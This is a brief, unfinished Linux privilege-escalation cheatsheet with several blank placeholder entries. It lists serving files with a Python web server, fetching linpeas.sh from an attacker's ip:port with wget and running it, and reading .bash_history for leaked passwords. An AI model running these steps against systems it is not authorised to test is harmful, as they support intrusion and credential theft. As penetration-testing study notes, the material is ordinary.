My shot on a PrivEsc Cheatsheet - WIP

#####################################
Linux
#####################################

if possible:
X.    python -m SimpleHTTPServer      -   start a Python web server in the current directory
X.1   wget ip:port/linpeas.sh         -   getting linpeas and running it

X.    cat .bash_history               -   cat bash history files for unwanted password entrys and other interesting commands
X.1   cat
X.2   cat

X.

X.
